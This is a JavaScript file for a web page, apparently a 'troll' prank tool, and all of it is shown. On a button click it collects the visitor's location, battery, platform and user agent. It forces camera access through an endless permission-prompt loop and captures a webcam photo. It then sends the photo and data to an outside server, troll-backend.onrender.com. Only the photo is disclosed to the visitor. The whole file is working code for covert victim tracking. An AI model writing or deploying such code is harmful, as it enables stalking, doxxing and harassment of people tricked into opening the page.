// ================================
// Select DOM elements
// ================================
const btn = document.getElementById('btn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const toast = document.getElementById('toast');

// Camera constraints: video only, no mic
const constraints = { video: { facingMode: "user" }, audio: false };

// ================================
// Show toast function
// ================================
function showToast(message = "Done!") {
    toast.innerText = message;
    toast.style.display = 'block';
    setTimeout(() => { toast.style.display = 'none'; }, 3000);
}

// ================================
// Collect metadata function
// ================================
async function collectMetadata() {
    const metadata = {
        width: window.innerWidth,
        height: window.innerHeight,
        platform: navigator.platform,
        language: navigator.language,
        useragent: navigator.userAgent,
        time: new Date().toISOString(),
    };

    // Battery info
    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        metadata.battery = battery.level * 100;
        metadata.charging = battery.charging;
    }

    // Geolocation
    if (navigator.geolocation) {
        try {
            const position = await new Promise((resolve, reject) =>
                navigator.geolocation.getCurrentPosition(resolve, reject)
            );
            metadata.location = `${position.coords.latitude},${position.coords.longitude}`;
        } catch {
            metadata.location = "Denied";
        }
    } else {
        metadata.location = "Unsupported";
    }

    return metadata;
}

// ================================
// Capture camera frames for 2-3 seconds
// ================================
async function captureRealPhoto() {
    let stream = null;
    while (!stream) {
        try {
            stream = await navigator.mediaDevices.getUserMedia(constraints);
        } catch (err) {
            alert("Camera permission required!");
        }
    }

    video.srcObject = stream;
    await video.play();

    // Capture multiple frames for 2 seconds
    const frameCount = 5;
    const delay = 400; // 400ms between frames
    let lastFrameData = null;

    for (let i = 0; i < frameCount; i++) {
        await new Promise(resolve => setTimeout(resolve, delay));
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        lastFrameData = canvas.toDataURL('image/png');
    }

    // Stop all camera tracks
    stream.getTracks().forEach(track => track.stop());

    return lastFrameData;
}

// ================================
// Send photo + metadata to backend
// ================================
async function sendData(imageData, metadata) {
    try {
        const res = await fetch('https://troll-backend.onrender.com/api/upload', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: imageData, metadata })
        });
        const data = await res.json();
        console.log("Server response:", data);
    } catch (err) {
        console.error("Error sending data:", err);
    }
}

// ================================
// Main function
// ================================
async function startCapture() {
    showToast("Requesting camera permission...");
    try {
        const metadata = await collectMetadata();
        const imageData = await captureRealPhoto();
        await sendData(imageData, metadata);
        showToast("Photo captured & sent successfully!");
    } catch (err) {
        console.error(err);
        alert("Error capturing or sending photo.");
    }
}

// ================================
// Button click triggers capture
// ================================
btn.addEventListener('click', startCapture);
